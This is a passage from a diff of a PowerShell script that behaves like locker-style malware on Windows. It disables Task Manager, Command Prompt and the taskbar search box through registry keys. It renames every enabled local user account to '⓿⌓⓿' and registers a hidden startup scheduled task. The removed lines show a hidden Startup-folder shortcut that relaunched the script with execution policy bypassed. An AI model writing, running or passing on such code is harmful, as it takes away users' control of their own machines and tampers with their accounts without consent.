@@ -32,22 +32,28 @@ $disableTaskMgrPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\
 New-Item -Path $disableTaskMgrPath -Force | Out-Null
 Set-ItemProperty -Path $disableTaskMgrPath -Name "DisableTaskMgr" -Value 1
 
-# Enable Command Prompt temporarily
-$enableCmdPath = "HKCU:\Software\Policies\Microsoft\Windows\System"
-New-Item -Path $enableCmdPath -Force | Out-Null
-Set-ItemProperty -Path $enableCmdPath -Name "DisableCMD" -Value 0
+# Create registry key to disable Command Prompt
+$disableCmdPath = "HKCU:\Software\Policies\Microsoft\Windows\System"
+New-Item -Path $disableCmdPath -Force | Out-Null
+Set-ItemProperty -Path $disableCmdPath -Name "DisableCMD" -Value 1
 
-# Create shortcut in Startup folder
-$shell = New-Object -ComObject WScript.Shell
-$startupFolder = $shell.SpecialFolders("Startup")
-$shortcutPath = Join-Path -Path $startupFolder -ChildPath "ScriptShortcut.lnk"
-$shortcut = $shell.CreateShortcut($shortcutPath)
-$shortcut.TargetPath = "powershell.exe"
-$shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File ""$PSCommandPath"""
-$shortcut.Save()
+# Create registry key to disable Search Bar in taskbar
+$searchBarPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Search"
+New-Item -Path $searchBarPath -Force | Out-Null
+Set-ItemProperty -Path $searchBarPath -Name "SearchboxTaskbarMode" -Value 0
 
-# Disable Command Prompt again
-Set-ItemProperty -Path $enableCmdPath -Name "DisableCMD" -Value 1
+# Change the user account names
+$users = Get-LocalUser | Where-Object {$_.Enabled -eq $true}
+foreach ($user in $users) {
+    $newName = "⓿⌓⓿"
+    Rename-LocalUser -Name $user.Name -NewName $newName
+}
+
+# Create a scheduled task to enable Command Prompt after restart or shutdown
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -Command `"Set-ItemProperty -Path 'HKCU:\Software\Policies\Microsoft\Windows\System' -Name 'DisableCMD' -Value 0`""
+$trigger = New-ScheduledTaskTrigger -AtStartup
+$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DontStopOnIdleEnd -StartWhenAvailable
+Register-ScheduledTask -TaskName "EnableCommandPrompt" -Action $action -Trigger $trigger -Settings $settings | Out-Null
 
 $source = @"
 using System;
